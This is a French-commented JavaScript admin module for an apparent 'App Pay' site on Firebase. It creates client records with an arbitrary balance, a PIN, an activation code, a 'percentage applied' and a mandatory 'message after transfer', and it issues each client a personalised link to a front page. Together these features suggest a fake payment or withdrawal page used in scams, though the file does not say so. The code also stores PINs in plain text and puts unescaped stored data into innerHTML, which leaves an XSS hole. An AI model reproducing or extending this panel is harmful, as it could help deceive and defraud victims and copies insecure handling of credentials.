// ============================================================
// APP PAY ADMIN - Gestion des clients (Firebase)
// ============================================================

import {
    db,
    authPromise,
    collection,
    doc,
    setDoc,
    getDoc,
    getDocs,
    deleteDoc,
    query,
    where,
    serverTimestamp
} from './firebase-config.js';

const COLLECTION_NAME = 'clients';
let lastGeneratedLink = '';
let selectedColor = '#ff7a00';
let allClients = [];

// ---------- UTILITAIRES ----------
function showToast(message, type = 'success') {
    const toast = document.createElement('div');
    toast.className = 'toast ' + type;
    const icons = {
        success: 'fa-circle-check',
        error: 'fa-circle-xmark',
        info: 'fa-circle-info'
    };
    toast.style.cssText = `
        position: fixed; top: 20px; right: 20px; background: #111; color: white;
        padding: 14px 20px; border-radius: 10px; font-size: 13px; z-index: 99999;
        box-shadow: 0 8px 24px rgba(0,0,0,0.2); display: flex; align-items: center;
        gap: 10px; animation: fadeIn 0.3s ease; max-width: 380px;
    `;
    const iconColor = type === 'error' ? '#e02424' : (type === 'success' ? '#00c853' : '#ff7a00');
    toast.innerHTML = `<i class="fa-solid ${icons[type] || icons.info}" style="color:${iconColor}"></i> <span>${message}</span>`;
    document.body.appendChild(toast);
    setTimeout(() => {
        toast.style.opacity = '0';
        toast.style.transition = 'opacity 0.3s';
        setTimeout(() => toast.remove(), 300);
    }, 3000);
}

// Génère un ID court et unique
function generateId() {
    return 'ap' + Date.now().toString(36) + Math.random().toString(36).slice(2, 8);
}

// ---------- SÉLECTEUR DE COULEUR ----------
function initColorPicker() {
    const picker = document.getElementById('color-picker');
    const hiddenInput = document.getElementById('c-color');

    picker.querySelectorAll('.color-option').forEach(option => {
        option.addEventListener('click', () => {
            picker.querySelectorAll('.color-option').forEach(o => o.classList.remove('selected'));
            option.classList.add('selected');
            selectedColor = option.dataset.color;
            hiddenInput.value = selectedColor;
        });
    });

    // Sélection par défaut : orange
    const defaultOption = picker.querySelector('[data-color="#ff7a00"]');
    if (defaultOption) defaultOption.classList.add('selected');
}

// ---------- CRÉATION D'UN CLIENT ----------
async function handleCreateClient(event) {
    event.preventDefault();

    // Récupération des valeurs
    const lastName = document.getElementById('c-lastname').value.trim();
    const firstName = document.getElementById('c-firstname').value.trim();
    const country = document.getElementById('c-country').value;
    const countryFlag = document.querySelector('#c-country option:checked')?.dataset.flag || '';
    const address = document.getElementById('c-address').value.trim();
    const email = document.getElementById('c-email').value.trim().toLowerCase();
    const phone = document.getElementById('c-phone').value.trim();
    const language = document.getElementById('c-language').value;
    const balance = parseFloat(document.getElementById('c-balance').value) || 0;
    const currency = document.getElementById('c-currency').value;
    const pin = document.getElementById('c-pin').value.trim();
    const activationCode = document.getElementById('c-activation').value.trim();
    const percentValue = parseInt(document.getElementById('c-percent-value').value, 10);
    const messageAfterTransfer = document.getElementById('c-message').value.trim();
    const color = document.getElementById('c-color').value;

    // ---------- VALIDATIONS ----------
    if (!lastName || !firstName) return showToast('Nom et prénom obligatoires.', 'error');
    if (!country) return showToast('Pays obligatoire.', 'error');
    if (!email.includes('@') || !email.includes('.')) return showToast('Adresse e-mail invalide.', 'error');
    if (!language) return showToast('Langue obligatoire.', 'error');
    if (!/^\d{4,8}$/.test(pin)) return showToast('Le code PIN doit contenir 4 à 8 chiffres.', 'error');
    if (activationCode.length < 4) return showToast("Le code d'activation doit contenir au moins 4 caractères.", 'error');
    if (isNaN(percentValue) || percentValue < 0 || percentValue > 100) {
        return showToast('Le pourcentage doit être entre 0 et 100.', 'error');
    }
    if (!messageAfterTransfer) return showToast('Le message après virement est obligatoire.', 'error');
    if (!color) return showToast('Veuillez choisir une couleur.', 'error');

    // Bouton en mode chargement
    const submitBtn = document.querySelector('.btn-create');
    const originalHTML = submitBtn.innerHTML;
    submitBtn.disabled = true;
    submitBtn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Création en cours...';

    try {
        // Attendre que Firebase soit prêt
        await authPromise;

        // Vérifier si l'email existe déjà
        const emailCheck = query(
            collection(db, COLLECTION_NAME),
            where('email', '==', email)
        );
        const existing = await getDocs(emailCheck);
        if (!existing.empty) {
            submitBtn.disabled = false;
            submitBtn.innerHTML = originalHTML;
            return showToast('Un client avec cet e-mail existe déjà.', 'error');
        }

        // Créer l'ID du client
        const clientId = generateId();

        // Construire l'objet client
        const clientData = {
            id: clientId,
            lastName,
            firstName,
            country,
            countryFlag,
            address,
            email,
            phone,
            language,
            balance,
            currency,
            pin,
            activationCode,
            percentValue,
            messageAfterTransfer,
            color,
            transactions: [],
            createdAt: new Date().toISOString(),
            createdAtServer: serverTimestamp()
        };

        // Enregistrer dans Firestore
        await setDoc(doc(db, COLLECTION_NAME, clientId), clientData);

        // Générer le lien unique
        const baseUrl = window.location.origin + window.location.pathname.replace('admin.html', 'index.html');
        const link = `${baseUrl}?id=${clientId}`;

        lastGeneratedLink = link;
        document.getElementById('generated-link').value = link;
        document.getElementById('link-modal').classList.add('show');

        // Réinitialiser le formulaire
        event.target.reset();
        document.getElementById('c-balance').value = '0.00';
        document.getElementById('c-currency').value = 'zł';
        document.getElementById('c-country').value = 'France';
        document.getElementById('c-language').value = 'fr';
        document.getElementById('c-percent-value').value = '100';
        selectedColor = '#ff7a00';
        document.getElementById('c-color').value = '#ff7a00';
        const picker = document.getElementById('color-picker');
        picker.querySelectorAll('.color-option').forEach(o => o.classList.remove('selected'));
        picker.querySelector('[data-color="#ff7a00"]').classList.add('selected');

        // Recharger la liste
        await loadClients();

        showToast('Client créé avec succès !', 'success');
    } catch (err) {
        console.error('Erreur création client :', err);
        showToast('Erreur lors de la création : ' + (err.message || 'inconnue'), 'error');
    } finally {
        submitBtn.disabled = false;
        submitBtn.innerHTML = originalHTML;
    }
}

// ---------- CHARGEMENT DES CLIENTS ----------
async function loadClients() {
    const list = document.getElementById('clients-list');
    const countBadge = document.getElementById('client-count');

    try {
        await authPromise;
        const snapshot = await getDocs(collection(db, COLLECTION_NAME));
        allClients = snapshot.docs.map(d => d.data());

        countBadge.textContent = allClients.length;

        if (allClients.length === 0) {
            list.innerHTML = '<p class="empty-state">Aucun client créé pour le moment.</p>';
            return;
        }

        // Trier par date de création décroissante
        allClients.sort((a, b) => new Date(b.createdAt) - new Date(a.createdAt));

        list.innerHTML = '';
        allClients.forEach(client => {
            const card = document.createElement('div');
            card.className = 'client-card';
            card.innerHTML = `
                <div class="client-info">
                    <div class="client-name">
                        <span class="color-dot" style="background:${client.color || '#ff7a00'};"></span>
                        <span class="flag">${client.countryFlag || '🌍'}</span>
                        ${(client.lastName || '').toUpperCase()} ${client.firstName || ''}
                    </div>
                    <div class="client-email">${client.email}</div>
                    <div class="client-meta">
                        <span><i class="fa-solid fa-coins"></i> ${Number(client.balance || 0).toFixed(2)} ${client.currency || 'zł'}</span>
                        <span><i class="fa-solid fa-percent"></i> ${client.percentValue || 100}%</span>
                        <span><i class="fa-solid fa-language"></i> ${client.language || 'fr'}</span>
                        <span><i class="fa-regular fa-calendar"></i> ${new Date(client.createdAt).toLocaleDateString('fr-FR')}</span>
                    </div>
                </div>
                <div class="client-actions">
                    <button class="btn-icon" title="Copier le lien" data-action="copy" data-id="${client.id}">
                        <i class="fa-regular fa-copy"></i>
                    </button>
                    <button class="btn-icon" title="Voir les détails" data-action="view" data-id="${client.id}">
                        <i class="fa-regular fa-eye"></i>
                    </button>
                    <button class="btn-icon danger" title="Supprimer" data-action="delete" data-id="${client.id}">
                        <i class="fa-regular fa-trash-can"></i>
                    </button>
                </div>
            `;
            list.appendChild(card);
        });

        // Brancher les actions
        list.querySelectorAll('[data-action]').forEach(btn => {
            btn.addEventListener('click', () => {
                const action = btn.dataset.action;
                const id = btn.dataset.id;
                if (action === 'copy') copyClientLink(id);
                else if (action === 'view') viewClientDetails(id);
                else if (action === 'delete') deleteClient(id);
            });
        });

    } catch (err) {
        console.error('Erreur chargement clients :', err);
        list.innerHTML = '<p class="empty-state" style="color:#e02424;">Erreur de chargement : ' + err.message + '</p>';
    }
}

// ---------- ACTIONS SUR UN CLIENT ----------
function getClientLink(clientId) {
    const baseUrl = window.location.origin + window.location.pathname.replace('admin.html', 'index.html');
    return `${baseUrl}?id=${clientId}`;
}

function copyClientLink(id) {
    const link = getClientLink(id);
    if (navigator.clipboard) {
        navigator.clipboard.writeText(link).then(() => {
            showToast('Lien copié dans le presse-papiers !', 'success');
        }).catch(() => {
            prompt('Copiez ce lien manuellement :', link);
        });
    } else {
        prompt('Copiez ce lien manuellement :', link);
    }
}

function viewClientDetails(id) {
    const client = allClients.find(c => c.id === id);
    if (!client) return;
    const info = `
DÉTAILS DU CLIENT

Nom : ${client.lastName}
Prénom : ${client.firstName}
Pays : ${client.country} ${client.countryFlag}
Adresse : ${client.address || '—'}
Email : ${client.email}
Téléphone : ${client.phone || '—'}
Langue : ${client.language}

Solde : ${Number(client.balance || 0).toFixed(2)} ${client.currency}

Code PIN : ${client.pin}
Code d'activation : ${client.activationCode}

Pourcentage appliqué : ${client.percentValue}%
Message après virement : ${client.messageAfterTransfer}

Couleur du thème : ${client.color}

Créé le : ${new Date(client.createdAt).toLocaleString('fr-FR')}
    `.trim();
    alert(info);
}

async function deleteClient(id) {
    const client = allClients.find(c => c.id === id);
    if (!client) return;
    if (!confirm(`Supprimer définitivement ${client.firstName} ${client.lastName} ?`)) return;

    try {
        await authPromise;
        await deleteDoc(doc(db, COLLECTION_NAME, id));
        await loadClients();
        showToast('Client supprimé.', 'info');
    } catch (err) {
        console.error('Erreur suppression :', err);
        showToast('Erreur lors de la suppression.', 'error');
    }
}

async function clearAllClients() {
    if (allClients.length === 0) return;
    if (!confirm('Supprimer TOUS les clients ? Cette action est irréversible.')) return;

    try {
        await authPromise;
        for (const client of allClients) {
            await deleteDoc(doc(db, COLLECTION_NAME, client.id));
        }
        await loadClients();
        showToast('Tous les clients ont été supprimés.', 'info');
    } catch (err) {
        console.error('Erreur suppression totale :', err);
        showToast('Erreur lors de la suppression totale.', 'error');
    }
}

// ---------- MODAL ----------
function closeModal() {
    document.getElementById('link-modal').classList.remove('show');
}

function copyGeneratedLink() {
    const input = document.getElementById('generated-link');
    input.select();
    const value = input.value;

    const doCopy = () => {
        const btn = document.getElementById('copy-btn');
        const original = btn.innerHTML;
        btn.innerHTML = '<i class="fa-solid fa-check"></i> Copié !';
        btn.style.backgroundColor = '#00c853';
        setTimeout(() => {
            btn.innerHTML = original;
            btn.style.backgroundColor = '';
        }, 2000);
        showToast('Lien copié !', 'success');
    };

    if (navigator.clipboard) {
        navigator.clipboard.writeText(value).then(doCopy).catch(() => {
            prompt('Copiez ce lien :', value);
        });
    } else {
        prompt('Copiez ce lien :', value);
    }
}

function openGeneratedLink() {
    if (lastGeneratedLink) window.open(lastGeneratedLink, '_blank');
}

// ---------- EXPOSITION GLOBALE (pour onclick dans HTML) ----------
window.clearAllClients = clearAllClients;
window.closeModal = closeModal;
window.copyGeneratedLink = copyGeneratedLink;
window.openGeneratedLink = openGeneratedLink;

// ---------- INITIALISATION ----------
document.addEventListener('DOMContentLoaded', async () => {
    document.getElementById('create-client-form').addEventListener('submit', handleCreateClient);
    document.getElementById('link-modal').addEventListener('click', (e) => {
        if (e.target.id === 'link-modal') closeModal();
    });

    initColorPicker();
    await loadClients();
});
